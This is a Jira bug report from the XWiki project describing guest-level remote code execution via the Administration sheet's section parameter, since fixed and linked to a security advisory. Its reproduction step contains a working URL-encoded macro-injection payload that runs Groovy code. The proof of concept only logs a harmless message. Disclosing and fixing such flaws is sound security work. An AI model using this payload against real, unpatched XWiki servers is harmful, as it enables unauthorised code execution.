

[Log in](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-21110)[Skip to main content](#main)[Skip to sidebar](#sidebar)Linked ApplicationsLoadingâ€¦[![XWiki.org JIRA](/s/-65z3d2/930000/8ws80b/_/jira-logo-scaled.png)](https://jira.xwiki.org/secure/MyJiraHome.jspa)

* [Dashboards](/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/secure/BrowseProjects.jspa "View recent projects and browse a list of projects")
* [Issues](/issues/ "Search for issues and view recent issues")

* Give feedback to Atlassian
* [Help](https://docs.atlassian.com/jira/jcore-docs-093/ "Help")
  + [Jira Core help](https://docs.atlassian.com/jira/jcore-docs-093/ "Go to the online documentation for Jira Core")
  + [Keyboard Shortcuts](/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-21110)

![Uploaded image for project: 'XWiki Platform'](https://jira.xwiki.org/secure/projectavatar?pid=10010&avatarId=13602)

1. [XWiki Platform](/browse/XWIKI)
2. [XWIKI-21110](/browse/XWIKI-21110)

# Remote code execution through the section parameter in Administration as guest

[Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-21110 "Log In")ClosedExportnull

XMLWordPrintable
#### Details

* **Type:**
  ![](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.") Bug
* **Resolution:**
  Fixed
* **Priority:**
  ![](/images/icons/priorities/blocker.svg "Blocker - Blocks development and/or testing work, production could not run.") Blocker
* **Fix Version/s:**
  [15.6-rc-1](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+15.6-rc-1 "15.6-rc-1 "), [14.10.14](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+14.10.14 "14.10.14 "), [15.5.1](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+15.5.1 "15.5.1 ")
* **Affects Version/s:**
  1.7
* **Component/s:**
  [Administration](/issues/?jql=project+%3D+XWIKI+AND+component+%3D+Administration "Administration ")
* **Labels:**
  + [attack\_escalation](/issues/?jql=labels+%3D+attack_escalation "attack_escalation")
  + [attacker\_guest](/issues/?jql=labels+%3D+attacker_guest "attacker_guest")
  + [security](/issues/?jql=labels+%3D+security "security")
* **Environment:**
  Windows 11 Pro, Edge 114, using a local instance of XWiki 15.5, Jetty/HSQLDB

* **Tests:**
  Unit
* **Difficulty:**
  Unknown
* **Documentation:**
  N/A
* **Documentation in Release Notes:**
  N/A
* **Similar issues:**

#### Description

**Steps to reproduce**

1. As a guest user, go to <server>/xwiki/bin/view/Main/WebHome?sheet=XWiki.AdminSheet&viewer=content&section=%5D%5D%7B%7B%2Fhtml%7D%7D%7B%7Basync%7D%7D%7B%7Bgroovy%7D%7Dservices.logging.getLogger(%22attacker%22).error(%22Attack%20succeeded!%22)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D

**Expected results**

The content is not executed, no error is logged in console.

**Actual results**

The content is executed and the following error is displayed in the logs:

```
2023-07-05 15:21:50,350 [org.xwiki.rendering.async.internal.AsyncRendererJob@14a7a3cf([async, macro, xwiki:XWiki.AdminSheet, 22, author, xwiki:XWiki.superadmin, rendering.restricted, false, secureDocument, xwiki:XWiki.AdminSheet, 176])] ERROR attacker                       - Attack succeeded!
```

#### Attachments

#### Attachments

* Options
  + [Sort By Name](/browse/XWIKI-21110?attachmentSortBy=fileName#attachmentmodule "viewissue.subtasks.tab.show.all.name")
  + [Sort By Date](/browse/XWIKI-21110?attachmentSortBy=dateTime#attachmentmodule "Sort By Date")
  + [Ascending](/browse/XWIKI-21110?attachmentOrder=asc#attachmentmodule "Ascending")
  + [Descending](/browse/XWIKI-21110?attachmentOrder=desc#attachmentmodule "Descending")
  + [Thumbnails](/browse/XWIKI-21110?attachmentViewMode=gallery#attachmentmodule "Thumbnails")
  + [List](/browse/XWIKI-21110?attachmentViewMode=list#attachmentmodule "List")
  + [Download All](/secure/attachmentzip/71549.zip "Download all attachments as a ZIP file")

1. [![Content_executed_Guest.png](https://jira.xwiki.org/secure/thumbnail/41485/_thumb_41485.png)](/secure/attachment/41485/Content_executed_Guest.png "Content_executed_Guest.png - Latest 05/Jul/23 14:31 - Ilie Andriuta")[Content\_executed\_Guest.png](/secure/attachment/41485/Content_executed_Guest.png "Content_executed_Guest.png - Latest 05/Jul/23 14:31 - Ilie Andriuta")82 kB05/Jul/23 14:31
#### Issue Links

links to

![Web Link](https://github.com/favicon.ico "Web Link")
[Security Advisory](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-62pr-qqf7-hh89)

#### Activity

#### People

Assignee:

![MichaelHamann](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Michael Hamann

Reporter:

![iandriuta](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Ilie Andriuta

Votes:
0
Vote for this issue

Watchers:
1
Start watching this issue

#### Dates

Created:

05/Jul/23 14:31

Updated:

03/Nov/23 14:47

Resolved:

11/Jul/23 16:55

Date of First Response:

11/Jul/23 5:47 PM

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for XWiki.org. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)

